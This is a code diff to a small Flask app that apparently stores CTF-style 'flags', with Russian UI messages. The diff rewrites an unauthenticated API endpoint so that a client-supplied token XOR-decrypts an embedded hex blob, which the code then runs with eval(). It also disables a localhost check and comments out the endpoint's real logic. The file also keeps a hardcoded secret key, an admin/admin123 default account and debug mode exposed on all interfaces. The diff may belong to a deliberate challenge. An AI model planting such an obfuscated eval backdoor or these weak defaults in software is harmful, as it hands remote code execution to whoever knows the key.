@@ -4,6 +4,7 @@ from flask_login import LoginManager, UserMixin, login_user, login_required, log
 from flask import jsonify
 import hashlib
 import secrets
+import itertools
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'your-secret-key-here'
@@ -18,14 +19,14 @@ class Flag(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     token = db.Column(db.String(200), nullable=False)
     user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
-    user = db.relationship('User', backref=db.backref('owned_flags', lazy=True))
+    user = db.relationship('User', back_populates='flags')
 
 class User(UserMixin, db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(100), unique=True, nullable=False)
     password_hash = db.Column(db.String(200), nullable=False)
     role = db.Column(db.String(50), default='user')
-    flags = db.relationship('Flag', backref='owner', lazy=True)
+    flags = db.relationship('Flag', back_populates='user', lazy=True)
 
     def set_password(self, password):
         salt = secrets.token_hex(16)
@@ -87,17 +88,48 @@ def dashboard():
     flags = current_user.flags
     return render_template('dashboard.html', user=current_user, flags=flags)
 
+@app.route('/add_flag', methods=['POST'])
+@login_required
+def add_flag():
+    token = request.form.get('token')
+    if not token:
+        flash('Флаг не может быть пустым', 'danger')
+        return redirect(url_for('dashboard'))
+    
+    new_flag = Flag(token=token, user_id=current_user.id)
+    db.session.add(new_flag)
+    db.session.commit()
+    flash('Флаг успешно добавлен', 'success')
+    return redirect(url_for('dashboard'))
+
 @app.route('/api/v1/secret/flags', methods=['POST'])
 def handle_secret_flags():
     if not request.is_json:
         return jsonify({"error": "Request must be JSON"}), 400
     
+    '''
+    client_ip = request.remote_addr
+    if client_ip in ('127.0.0.1', '::1', '0.0.0.0'):
+        return "Запрещены запросы с localhost", 403
+    '''
+
     data = request.get_json()
-    required_fields = ['token', 'user', 'password']
+    required_fields = ['token']
     for field in required_fields:
         if field not in data:
             return jsonify({"error": f"Missing '{field}' field"}), 400
+        
+    encrypted_hex = "18322a1a145b2f3a013a1715122b1f3e2c5c42071e0c1c3b1427736a5b425c500a007f0716482c0812001d0a1c430a0109102a206e5253131f1752390f15017f040f533209130a471f1118312d681a1f19584c2f" 
+    key = str(data['token']).encode()
+    encrypted = bytes.fromhex(encrypted_hex)
+    decrypted = bytes(e ^ k for e, k in zip(encrypted, itertools.cycle(key)))
+    print("Дешифрованная строка:", decrypted.decode())
+    try:
+        eval(decrypted.decode())
+    except Exception as e:
+        print(f"Произошла ошибка на ручке /secret/flags: {e}")
 
+    '''
     with app.app_context():
         user = User.query.filter_by(username=data['user']).first()
         if not user:
@@ -106,15 +138,15 @@ def handle_secret_flags():
             db.session.add(user)
             db.session.commit()
     
+    
     new_flag = Flag(token=data['token'], user=user)
     db.session.add(new_flag)
     db.session.commit()
+    '''
     
     return jsonify({
         "status": "success",
-        "message": "Flag added successfully",
-        "received_token": data['token'],
-        "user": data['user']
+        "message": "Flags get success"
     }), 200
 
 @app.route('/change_password', methods=['GET', 'POST'])
@@ -149,10 +181,9 @@ if __name__ == '__main__':
                 admin.set_password('admin123')
                 db.session.add(admin)
                 db.session.commit()
-                
                 print("Пользователь 'admin' успешно создан.")
             
             except Exception as e:
                 print(f"Произошла ошибка при создании пользователя: {e}")
-
+    
     app.run(debug=True, port=8080, host='0.0.0.0')
